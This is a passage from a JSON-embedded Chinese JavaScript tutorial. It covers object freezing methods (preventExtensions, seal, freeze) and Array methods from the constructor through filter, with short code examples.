5\n\nobj.next = 10;\nobj.next // 10\n\nobj.next = 5;\n// Uncaught Error: 新的值必须大于当前值</code></pre><p>上面代码中，<code>next</code>属性的存值函数和取值函数，都依赖于内部属性<code>$n</code>。</p>\n\n        <h2>\n            <a href='#对象的拷贝' class='header-anchor'>#</a>\n            <span>对象的拷贝</span>\n        </h2>\n    <p>有时，我们需要将一个对象的所有属性，拷贝到另一个对象，可以用下面的方法实现。</p>\n<pre class=\"prettyprint language-javascript\"><code>var extend = function (to, from) {\n  for (var property in from) {\n    to[property] = from[property];\n  }\n\n  return to;\n}\n\nextend({}, {\n  a: 1\n})\n// {a: 1}</code></pre><p>上面这个方法的问题在于，如果遇到存取器定义的属性，会只拷贝值。</p>\n<pre class=\"prettyprint language-javascript\"><code>extend({}, {\n  get a() { return 1 }\n})\n// {a: 1}</code></pre><p>为了解决这个问题，我们可以通过<code>Object.defineProperty</code>方法来拷贝属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var extend = function (to, from) {\n  for (var property in from) {\n    if (!from.hasOwnProperty(property)) continue;\n    Object.defineProperty(\n      to,\n      property,\n      Object.getOwnPropertyDescriptor(from, property)\n    );\n  }\n\n  return to;\n}\n\nextend({}, { get a(){ return 1 } })\n// { get a(){ return 1 } })</code></pre><p>上面代码中，<code>hasOwnProperty</code>那一行用来过滤掉继承的属性，否则会报错，因为<code>Object.getOwnPropertyDescriptor</code>读不到继承属性的属性描述对象。</p>\n\n        <h2>\n            <a href='#控制对象状态' class='header-anchor'>#</a>\n            <span>控制对象状态</span>\n        </h2>\n    <p>有时需要冻结对象的读写状态，防止对象被改变。JavaScript 提供了三种冻结方法，最弱的一种是<code>Object.preventExtensions</code>，其次是<code>Object.seal</code>，最强的是<code>Object.freeze</code>。</p>\n\n        <h3>\n            <a href='#Object.preventExtensions()' class='header-anchor'>#</a>\n            <span>Object.preventExtensions()</span>\n        </h3>\n    <p><code>Object.preventExtensions</code>方法可以使得一个对象无法再添加新的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nObject.defineProperty(obj, &#039;p&#039;, {\n  value: &#039;hello&#039;\n});\n// TypeError: Cannot define property:p, object is not extensible.\n\nobj.p = 1;\nobj.p // undefined</code></pre><p>上面代码中，<code>obj</code>对象经过<code>Object.preventExtensions</code>以后，就无法添加新属性了。</p>\n\n        <h3>\n            <a href='#Object.isExtensible()' class='header-anchor'>#</a>\n            <span>Object.isExtensible()</span>\n        </h3>\n    <p><code>Object.isExtensible</code>方法用于检查一个对象是否使用了<code>Object.preventExtensions</code>方法。也就是说，检查是否可以为一个对象添加属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\n\nObject.isExtensible(obj) // true\nObject.preventExtensions(obj);\nObject.isExtensible(obj) // false</code></pre><p>上面代码中，对<code>obj</code>对象使用<code>Object.preventExtensions</code>方法以后，再使用<code>Object.isExtensible</code>方法，返回<code>false</code>，表示已经不能添加新属性了。</p>\n\n        <h3>\n            <a href='#Object.seal()' class='header-anchor'>#</a>\n            <span>Object.seal()</span>\n        </h3>\n    <p><code>Object.seal</code>方法使得一个对象既无法添加新属性，也无法删除旧属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;hello&#039; };\nObject.seal(obj);\n\ndelete obj.p;\nobj.p // &quot;hello&quot;\n\nobj.x = &#039;world&#039;;\nobj.x // undefined</code></pre><p>上面代码中，<code>obj</code>对象执行<code>Object.seal</code>方法以后，就无法添加新属性和删除旧属性了。</p>\n<p><code>Object.seal</code>实质是把属性描述对象的<code>configurable</code>属性设为<code>false</code>，因此属性描述对象不再能改变了。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;a&#039;\n};\n\n// seal方法之前\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object {\n//   value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: true\n// }\n\nObject.seal(obj);\n\n// seal方法之后\nObject.getOwnPropertyDescriptor(obj, &#039;p&#039;)\n// Object {\n//   value: &quot;a&quot;,\n//   writable: true,\n//   enumerable: true,\n//   configurable: false\n// }\n\nObject.defineProperty(o, &#039;p&#039;, {\n  enumerable: false\n})\n// TypeError: Cannot redefine property: p</code></pre><p>上面代码中，使用<code>Object.seal</code>方法之后，属性描述对象的<code>configurable</code>属性就变成了<code>false</code>，然后改变<code>enumerable</code>属性就会报错。</p>\n<p><code>Object.seal</code>只是禁止新增或删除属性，并不影响修改某个属性的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\nObject.seal(obj);\nobj.p = &#039;b&#039;;\nobj.p // &#039;b&#039;</code></pre><p>上面代码中，<code>Object.seal</code>方法对<code>p</code>属性的<code>value</code>无效，是因为此时<code>p</code>属性的可写性由<code>writable</code>决定。</p>\n\n        <h3>\n            <a href='#Object.isSealed()' class='header-anchor'>#</a>\n            <span>Object.isSealed()</span>\n        </h3>\n    <p><code>Object.isSealed</code>方法用于检查一个对象是否使用了<code>Object.seal</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.seal(obj);\nObject.isSealed(obj) // true</code></pre><p>这时，<code>Object.isExtensible</code>方法也返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: &#039;a&#039; };\n\nObject.seal(obj);\nObject.isExtensible(obj) // false</code></pre>\n        <h3>\n            <a href='#Object.freeze()' class='header-anchor'>#</a>\n            <span>Object.freeze()</span>\n        </h3>\n    <p><code>Object.freeze</code>方法可以使得一个对象无法添加新属性、无法删除旧属性、也无法改变属性的值，使得这个对象实际上变成了常量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nobj.p = &#039;world&#039;;\nobj.p // &quot;hello&quot;\n\nobj.t = &#039;hello&#039;;\nobj.t // undefined\n\ndelete obj.p // false\nobj.p // &quot;hello&quot;</code></pre><p>上面代码中，对<code>obj</code>对象进行<code>Object.freeze()</code>以后，修改属性、新增属性、删除属性都无效了。这些操作并不报错，只是默默地失败。如果在严格模式下，则会报错。</p>\n\n        <h3>\n            <a href='#Object.isFrozen()' class='header-anchor'>#</a>\n            <span>Object.isFrozen()</span>\n        </h3>\n    <p><code>Object.isFrozen</code>方法用于检查一个对象是否使用了<code>Object.freeze</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\nObject.isFrozen(obj) // true</code></pre><p>使用<code>Object.freeze</code>方法以后，<code>Object.isSealed</code>将会返回<code>true</code>，<code>Object.isExtensible</code>返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nObject.isSealed(obj) // true\nObject.isExtensible(obj) // false</code></pre><p><code>Object.isFrozen</code>的一个用途是，确认某个对象没有被冻结后，再对它的属性赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;hello&#039;\n};\n\nObject.freeze(obj);\n\nif (!Object.isFrozen(obj)) {\n  obj.p = &#039;world&#039;;\n}</code></pre><p>上面代码中，确认<code>obj</code>没有被冻结后，再对它的属性赋值，就不会报错了。</p>\n\n        <h3>\n            <a href='#局限性' class='header-anchor'>#</a>\n            <span>局限性</span>\n        </h3>\n    <p>上面的三个方法锁定对象的可写性有一个漏洞：可以通过改变原型对象，来为对象增加属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nvar proto = Object.getPrototypeOf(obj);\nproto.t = &#039;hello&#039;;\nobj.t\n// hello</code></pre><p>上面代码中，对象<code>obj</code>本身不能新增属性，但是可以在它的原型对象上新增属性，就依然能够在<code>obj</code>上读到。</p>\n<p>一种解决方案是，把<code>obj</code>的原型也冻结住。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = new Object();\nObject.preventExtensions(obj);\n\nvar proto = Object.getPrototypeOf(obj);\nObject.preventExtensions(proto);\n\nproto.t = &#039;hello&#039;;\nobj.t // undefined</code></pre><p>另外一个局限是，如果属性值是对象，上面这些方法只能冻结属性指向的对象，而不能冻结对象本身的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  foo: 1,\n  bar: [&#039;a&#039;, &#039;b&#039;]\n};\nObject.freeze(obj);\n\nobj.bar.push(&#039;c&#039;);\nobj.bar // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，<code>obj.bar</code>属性指向一个数组，<code>obj</code>对象被冻结以后，这个指向无法改变，即无法指向其他值，但是所指向的数组是可以改变的。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Array 对象","link":"/stdlib/array.html"}],"content":"\n        <h1>\n            <a href='#Array-对象' class='header-anchor'>#</a>\n            <span>Array 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#构造函数' class='header-anchor'>#</a>\n            <span>构造函数</span>\n        </h2>\n    <p><code>Array</code>是 JavaScript 的原生对象，同时也是一个构造函数，可以用它生成新的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = new Array(2);\narr.length // 2\narr // [ empty x 2 ]</code></pre><p>上面代码中，<code>Array</code>构造函数的参数<code>2</code>，表示生成一个两个成员的数组，每个位置都是空值。</p>\n<p>如果没有使用<code>new</code>，运行结果也是一样的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = new Array(2);\n// 等同于\nvar arr = Array(2);</code></pre><p><code>Array</code>构造函数有一个很大的缺陷，就是不同的参数，会导致它的行为不一致。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 无参数时，返回一个空数组\nnew Array() // []\n\n// 单个正整数参数，表示返回的新数组的长度\nnew Array(1) // [ empty ]\nnew Array(2) // [ empty x 2 ]\n\n// 非正整数的数值作为参数，会报错\nnew Array(3.2) // RangeError: Invalid array length\nnew Array(-3) // RangeError: Invalid array length\n\n// 单个非数值（比如字符串、布尔值、对象等）作为参数，\n// 则该参数是返回的新数组的成员\nnew Array(&#039;abc&#039;) // [&#039;abc&#039;]\nnew Array([1]) // [Array[1]]\n\n// 多参数时，所有参数都是返回的新数组的成员\nnew Array(1, 2) // [1, 2]\nnew Array(&#039;a&#039;, &#039;b&#039;, &#039;c&#039;) // [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;]</code></pre><p>可以看到，<code>Array</code>作为构造函数，行为很不一致。因此，不建议使用它生成新数组，直接使用数组字面量是更好的做法。</p>\n<pre class=\"prettyprint language-javascript\"><code>// bad\nvar arr = new Array(1, 2);\n\n// good\nvar arr = [1, 2];</code></pre><p>注意，如果参数是一个正整数，返回数组的成员都是空位。虽然读取的时候返回<code>undefined</code>，但实际上该位置没有任何值。虽然可以取到<code>length</code>属性，但是取不到键名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = new Array(3);\nvar b = [undefined, undefined, undefined];\n\na.length // 3\nb.length // 3\n\na[0] // undefined\nb[0] // undefined\n\n0 in a // false\n0 in b // true</code></pre><p>上面代码中，<code>a</code>是一个长度为3的空数组，<code>b</code>是一个三个成员都是<code>undefined</code>的数组。读取键值的时候，<code>a</code>和<code>b</code>都返回<code>undefined</code>，但是<code>a</code>的键位都是空的，<code>b</code>的键位是有值的。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Array.isArray()' class='header-anchor'>#</a>\n            <span>Array.isArray()</span>\n        </h3>\n    <p><code>Array.isArray</code>方法返回一个布尔值，表示参数是否为数组。它可以弥补<code>typeof</code>运算符的不足。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\n\ntypeof arr // &quot;object&quot;\nArray.isArray(arr) // true</code></pre><p>上面代码中，<code>typeof</code>运算符只能显示数组的类型是<code>Object</code>，而<code>Array.isArray</code>方法可以识别数组。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#valueOf()，toString()' class='header-anchor'>#</a>\n            <span>valueOf()，toString()</span>\n        </h3>\n    <p><code>valueOf</code>方法是一个所有对象都拥有的方法，表示对该对象求值。不同对象的<code>valueOf</code>方法不尽一致，数组的<code>valueOf</code>方法返回数组本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.valueOf() // [1, 2, 3]</code></pre><p><code>toString</code>方法也是对象的通用方法，数组的<code>toString</code>方法返回数组的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\narr.toString() // &quot;1,2,3&quot;\n\nvar arr = [1, 2, 3, [4, 5, 6]];\narr.toString() // &quot;1,2,3,4,5,6&quot;</code></pre>\n        <h3>\n            <a href='#push()，pop()' class='header-anchor'>#</a>\n            <span>push()，pop()</span>\n        </h3>\n    <p><code>push</code>方法用于在数组的末端添加一个或多个元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\n\narr.push(1) // 1\narr.push(&#039;a&#039;) // 2\narr.push(true, {}) // 4\narr // [1, &#039;a&#039;, true, {}]</code></pre><p>上面代码使用<code>push</code>方法，往数组中添加了四个成员。</p>\n<p><code>pop</code>方法用于删除数组的最后一个元素，并返回该元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\narr.pop() // &#039;c&#039;\narr // [&#039;a&#039;, &#039;b&#039;]</code></pre><p>对空数组使用<code>pop</code>方法，不会报错，而是返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>[].pop() // undefined</code></pre><p><code>push</code>和<code>pop</code>结合使用，就构成了“后进先出”的栈结构（stack）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [];\narr.push(1, 2);\narr.push(3);\narr.pop();\narr // [1, 2]</code></pre><p>上面代码中，<code>3</code>是最后进入数组的，但是最早离开数组。</p>\n\n        <h3>\n            <a href='#shift()，unshift()' class='header-anchor'>#</a>\n            <span>shift()，unshift()</span>\n        </h3>\n    <p><code>shift</code>方法用于删除数组的第一个元素，并返回该元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.shift() // &#039;a&#039;\na // [&#039;b&#039;, &#039;c&#039;]</code></pre><p><code>shift</code>方法可以遍历并清空一个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var list = [1, 2, 3, 4, 5, 6];\nvar item;\n\nwhile (item = list.shift()) {\n  console.log(item);\n}\n\nlist // []</code></pre><p><code>push</code>和<code>shift</code>结合使用，就构成了“先进先出”的队列结构（queue）。</p>\n<p><code>unshift</code>方法用于在数组的第一个位置添加元素，并返回添加新元素后的数组长度。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.unshift(&#039;x&#039;); // 4\na // [&#039;x&#039;, &#039;a&#039;, &#039;b&#039;, &#039;c&#039;]</code></pre><p><code>unshift</code>方法可以接受多个参数，这些参数都会添加到目标数组头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [ &#039;c&#039;, &#039;d&#039; ];\narr.unshift(&#039;a&#039;, &#039;b&#039;) // 4\narr // [ &#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039; ]</code></pre>\n        <h3>\n            <a href='#join()' class='header-anchor'>#</a>\n            <span>join()</span>\n        </h3>\n    <p><code>join</code>方法以指定参数作为分隔符，将所有数组成员连接为一个字符串返回。如果不提供参数，默认用逗号分隔。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3, 4];\n\na.join(&#039; &#039;) // &#039;1 2 3 4&#039;\na.join(&#039; | &#039;) // &quot;1 | 2 | 3 | 4&quot;\na.join() // &quot;1,2,3,4&quot;</code></pre><p>如果数组成员是<code>undefined</code>或<code>null</code>或空位，会被转成空字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>[undefined, null].join(&#039;#&#039;)\n// &#039;#&#039;\n\n[&#039;a&#039;,, &#039;b&#039;].join(&#039;-&#039;)\n// &#039;a--b&#039;</code></pre><p>通过<code>call</code>方法，这个方法也可以用于字符串或类似数组的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.join.call(&#039;hello&#039;, &#039;-&#039;)\n// &quot;h-e-l-l-o&quot;\n\nvar obj = { 0: &#039;a&#039;, 1: &#039;b&#039;, length: 2 };\nArray.prototype.join.call(obj, &#039;-&#039;)\n// &#039;a-b&#039;</code></pre>\n        <h3>\n            <a href='#concat()' class='header-anchor'>#</a>\n            <span>concat()</span>\n        </h3>\n    <p><code>concat</code>方法用于多个数组的合并。它将新数组的成员，添加到原数组成员的后部，然后返回一个新数组，原数组不变。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;hello&#039;].concat([&#039;world&#039;])\n// [&quot;hello&quot;, &quot;world&quot;]\n\n[&#039;hello&#039;].concat([&#039;world&#039;], [&#039;!&#039;])\n// [&quot;hello&quot;, &quot;world&quot;, &quot;!&quot;]\n\n[].concat({a: 1}, {b: 2})\n// [{ a: 1 }, { b: 2 }]\n\n[2].concat({a: 1})\n// [2, {a: 1}]</code></pre><p>除了数组作为参数，<code>concat</code>也接受其他类型的值作为参数，添加到目标数组尾部。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].concat(4, 5, 6)\n// [1, 2, 3, 4, 5, 6]</code></pre><p>如果数组成员包括对象，<code>concat</code>方法返回当前数组的一个浅拷贝。所谓“浅拷贝”，指的是新数组拷贝的是对象的引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { a: 1 };\nvar oldArray = [obj];\n\nvar newArray = oldArray.concat();\n\nobj.a = 2;\nnewArray[0].a // 2</code></pre><p>上面代码中，原数组包含一个对象，<code>concat</code>方法生成的新数组包含这个对象的引用。所以，改变原对象以后，新数组跟着改变。</p>\n\n        <h3>\n            <a href='#reverse()' class='header-anchor'>#</a>\n            <span>reverse()</span>\n        </h3>\n    <p><code>reverse</code>方法用于颠倒排列数组元素，返回改变后的数组。注意，该方法将改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.reverse() // [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]\na // [&quot;c&quot;, &quot;b&quot;, &quot;a&quot;]</code></pre>\n        <h3>\n            <a href='#slice()' class='header-anchor'>#</a>\n            <span>slice()</span>\n        </h3>\n    <p><code>slice</code>方法用于提取目标数组的一部分，返回一个新数组，原数组不变。</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.slice(start, end);</code></pre><p>它的第一个参数为起始位置（从0开始），第二个参数为终止位置（但该位置的元素本身不包括在内）。如果省略第二个参数，则一直返回到原数组的最后一个成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.slice(0) // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]\na.slice(1) // [&quot;b&quot;, &quot;c&quot;]\na.slice(1, 2) // [&quot;b&quot;]\na.slice(2, 6) // [&quot;c&quot;]\na.slice() // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</code></pre><p>上面代码中，最后一个例子<code>slice</code>没有参数，实际上等于返回一个原数组的拷贝。</p>\n<p>如果<code>slice</code>方法的参数是负数，则表示倒数计算的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\na.slice(-2) // [&quot;b&quot;, &quot;c&quot;]\na.slice(-2, -1) // [&quot;b&quot;]</code></pre><p>上面代码中，<code>-2</code>表示倒数计算的第二个位置，<code>-1</code>表示倒数计算的第一个位置。</p>\n<p>如果第一个参数大于等于数组长度，或者第二个参数小于第一个参数，则返回空数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\na.slice(4) // []\na.slice(2, 1) // []</code></pre><p><code>slice</code>方法的一个重要应用，是将类似数组的对象转为真正的数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>Array.prototype.slice.call({ 0: &#039;a&#039;, 1: &#039;b&#039;, length: 2 })\n// [&#039;a&#039;, &#039;b&#039;]\n\nArray.prototype.slice.call(document.querySelectorAll(&quot;div&quot;));\nArray.prototype.slice.call(arguments);</code></pre><p>上面代码的参数都不是数组，但是通过<code>call</code>方法，在它们上面调用<code>slice</code>方法，就可以把它们转为真正的数组。</p>\n\n        <h3>\n            <a href='#splice()' class='header-anchor'>#</a>\n            <span>splice()</span>\n        </h3>\n    <p><code>splice</code>方法用于删除原数组的一部分成员，并可以在删除的位置添加新的数组成员，返回值是被删除的元素。注意，该方法会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>arr.splice(start, count, addElement1, addElement2, ...);</code></pre><p><code>splice</code>的第一个参数是删除的起始位置（从0开始），第二个参数是被删除的元素个数。如果后面还有更多的参数，则表示这些就是要被插入数组的新元素。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(4, 2) // [&quot;e&quot;, &quot;f&quot;]\na // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;]</code></pre><p>上面代码从原数组4号位置，删除了两个数组成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(4, 2, 1, 2) // [&quot;e&quot;, &quot;f&quot;]\na // [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, 1, 2]</code></pre><p>上面代码除了删除成员，还插入了两个新成员。</p>\n<p>起始位置如果是负数，就表示从倒数位置开始删除。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;, &#039;e&#039;, &#039;f&#039;];\na.splice(-4, 2) // [&quot;c&quot;, &quot;d&quot;]</code></pre><p>上面代码表示，从倒数第四个位置<code>c</code>开始删除两个成员。</p>\n<p>如果只是单纯地插入元素，<code>splice</code>方法的第二个参数可以设为<code>0</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 1, 1];\n\na.splice(1, 0, 2) // []\na // [1, 2, 1, 1]</code></pre><p>如果只提供第一个参数，等同于将原数组在指定位置拆分成两个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [1, 2, 3, 4];\na.splice(2) // [3, 4]\na // [1, 2]</code></pre>\n        <h3>\n            <a href='#sort()' class='header-anchor'>#</a>\n            <span>sort()</span>\n        </h3>\n    <p><code>sort</code>方法对数组成员进行排序，默认是按照字典顺序排序。排序后，原数组将被改变。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;d&#039;, &#039;c&#039;, &#039;b&#039;, &#039;a&#039;].sort()\n// [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;, &#039;d&#039;]\n\n[4, 3, 2, 1].sort()\n// [1, 2, 3, 4]\n\n[11, 101].sort()\n// [101, 11]\n\n[10111, 1101, 111].sort()\n// [10111, 1101, 111]</code></pre><p>上面代码的最后两个例子，需要特殊注意。<code>sort</code>方法不是按照大小排序，而是按照字典顺序。也就是说，数值会被先转成字符串，再按照字典顺序进行比较，所以<code>101</code>排在<code>11</code>的前面。</p>\n<p>如果想让<code>sort</code>方法按照自定义方式排序，可以传入一个函数作为参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>[10111, 1101, 111].sort(function (a, b) {\n  return a - b;\n})\n// [111, 1101, 10111]</code></pre><p>上面代码中，<code>sort</code>的参数函数本身接受两个参数，表示进行比较的两个数组成员。如果该函数的返回值大于<code>0</code>，表示第一个成员排在第二个成员后面；其他情况下，都是第一个元素排在第二个元素前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>[\n  { name: &quot;张三&quot;, age: 30 },\n  { name: &quot;李四&quot;, age: 24 },\n  { name: &quot;王五&quot;, age: 28  }\n].sort(function (o1, o2) {\n  return o1.age - o2.age;\n})\n// [\n//   { name: &quot;李四&quot;, age: 24 },\n//   { name: &quot;王五&quot;, age: 28  },\n//   { name: &quot;张三&quot;, age: 30 }\n// ]</code></pre>\n        <h3>\n            <a href='#map()' class='header-anchor'>#</a>\n            <span>map()</span>\n        </h3>\n    <p><code>map</code>方法将数组的所有成员依次传入参数函数，然后把每一次的执行结果组成一个新数组返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var numbers = [1, 2, 3];\n\nnumbers.map(function (n) {\n  return n + 1;\n});\n// [2, 3, 4]\n\nnumbers\n// [1, 2, 3]</code></pre><p>上面代码中，<code>numbers</code>数组的所有成员依次执行参数函数，运行结果组成一个新数组返回，原数组没有变化。</p>\n<p><code>map</code>方法接受一个函数作为参数。该函数调用时，<code>map</code>方法向它传入三个参数：当前成员、当前位置和数组本身。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3].map(function(elem, index, arr) {\n  return elem * index;\n});\n// [0, 2, 6]</code></pre><p>上面代码中，<code>map</code>方法的回调函数有三个参数，<code>elem</code>为当前成员的值，<code>index</code>为当前成员的位置，<code>arr</code>为原数组（<code>[1, 2, 3]</code>）。</p>\n<p><code>map</code>方法还可以接受第二个参数，用来绑定回调函数内部的<code>this</code>变量（详见《this 变量》一章）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\n[1, 2].map(function (e) {\n  return this[e];\n}, arr)\n// [&#039;b&#039;, &#039;c&#039;]</code></pre><p>上面代码通过<code>map</code>方法的第二个参数，将回调函数内部的<code>this</code>对象，指向<code>arr</code>数组。</p>\n<p>如果数组有空位，<code>map</code>方法的回调函数在这个位置不会执行，会跳过数组的空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function (n) { return &#039;a&#039; };\n\n[1, undefined, 2].map(f) // [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]\n[1, null, 2].map(f) // [&quot;a&quot;, &quot;a&quot;, &quot;a&quot;]\n[1, , 2].map(f) // [&quot;a&quot;, , &quot;a&quot;]</code></pre><p>上面代码中，<code>map</code>方法不会跳过<code>undefined</code>和<code>null</code>，但是会跳过空位。</p>\n\n        <h3>\n            <a href='#forEach()' class='header-anchor'>#</a>\n            <span>forEach()</span>\n        </h3>\n    <p><code>forEach</code>方法与<code>map</code>方法很相似，也是对数组的所有成员依次执行参数函数。但是，<code>forEach</code>方法不返回值，只用来操作数据。这就是说，如果数组遍历的目的是为了得到返回值，那么使用<code>map</code>方法，否则使用<code>forEach</code>方法。</p>\n<p><code>forEach</code>的用法与<code>map</code>方法一致，参数是一个函数，该函数同样接受三个参数：当前值、当前位置、整个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>function log(element, index, array) {\n  console.log(&#039;[&#039; + index + &#039;] = &#039; + element);\n}\n\n[2, 5, 9].forEach(log);\n// [0] = 2\n// [1] = 5\n// [2] = 9</code></pre><p>上面代码中，<code>forEach</code>遍历数组不是为了得到返回值，而是为了在屏幕输出内容，所以不必使用<code>map</code>方法。</p>\n<p><code>forEach</code>方法也可以接受第二个参数，绑定参数函数的<code>this</code>变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var out = [];\n\n[1, 2, 3].forEach(function(elem) {\n  this.push(elem * elem);\n}, out);\n\nout // [1, 4, 9]</code></pre><p>上面代码中，空数组<code>out</code>是<code>forEach</code>方法的第二个参数，结果，回调函数内部的<code>this</code>关键字就指向<code>out</code>。</p>\n<p>注意，<code>forEach</code>方法无法中断执行，总是会将所有成员遍历完。如果希望符合某种条件时，就中断遍历，要使用<code>for</code>循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3];\n\nfor (var i = 0; i &lt; arr.length; i++) {\n  if (arr[i] === 2) break;\n  console.log(arr[i]);\n}\n// 1</code></pre><p>上面代码中，执行到数组的第二个成员时，就会中断执行。<code>forEach</code>方法做不到这一点。</p>\n<p><code>forEach</code>方法也会跳过数组的空位。</p>\n<pre class=\"prettyprint language-javascript\"><code>var log = function (n) {\n  console.log(n + 1);\n};\n\n[1, undefined, 2].forEach(log)\n// 2\n// NaN\n// 3\n\n[1, null, 2].forEach(log)\n// 2\n// 1\n// 3\n\n[1, , 2].forEach(log)\n// 2\n// 3</code></pre><p>上面代码中，<code>forEach</code>方法不会跳过<code>undefined</code>和<code>null</code>，但会跳过空位。</p>\n\n        <h3>\n            <a href='#filter()' class='header-anchor'>#</a>\n            <span>filter()</span>\n        </h3>\n    <p><code>filter</code>方法用于过滤数组成员，满足条件的成员组成一个新数组返回。</p>\n<p>它的参数是一个函数，所有数组成员依次执行该函数，返回结果为<code>true</code>的成员组成一个新数组返回。该方法不会改变原数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].filter(function (elem) {\n  return (elem &gt; 3);\n})\n// [4, 5]</code></pre><p>上面代码将大于<code>3</code>的数组成员，作为一个新数组返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [0, 1, 